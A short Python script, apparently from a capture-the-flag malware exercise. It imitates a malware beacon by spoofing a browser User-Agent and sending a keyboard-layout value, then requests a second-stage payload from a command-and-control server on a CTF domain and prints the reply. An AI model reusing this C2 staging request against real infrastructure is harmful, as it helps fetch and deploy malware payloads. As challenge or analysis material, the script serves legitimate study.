import requests

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
}

res = requests.post(
    "http://c2.capturetheflag.fr:4444/stage2",
    headers=headers,
    data={"language": "00000409"},
)
print(res.text)
